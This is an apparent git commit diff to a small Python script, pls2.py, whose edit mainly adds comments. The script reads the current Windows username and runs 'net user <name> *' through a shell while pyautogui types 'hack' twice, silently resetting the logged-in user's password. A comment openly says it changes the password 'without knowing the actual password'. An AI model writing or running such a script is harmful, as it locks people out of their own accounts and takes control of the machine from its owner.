b3b1f6a6d9a8872b5aa1a6f12d4714edb196905e
Pytools786 <77258429+Pytools786@users.noreply.github.com>
2021-01-22 13:43:46 +0530

    Update pls2.py

--- python project/python file/pls2.py
+++ python project/python file/pls2.py
@@ -1,7 +1,8 @@
 # This is a sample Python script.
-import getpass
-import subprocess
-import pyautogui
-username = getpass.getuser()
-print(username)
-subprocess.run("net user" +' "'+username+'"'+ " *",shell=True,input=pyautogui.typewrite(['h','a','c','k','enter','h','a','c','k','enter']))
+import getpass 
+import subprocess #execute system command 
+import pyautogui  #automate keyboard to type the password
+username = getpass.getuser() #get username of current login user
+subprocess.run("net user" +' "'+username+'"'+ " *",shell=True,input=pyautogui.typewrite(['h','a','c','k','enter','h','a','c','k','enter'])) 
+#above line will automatically changes the password for current login user to hack without knowing the actual password
+ 
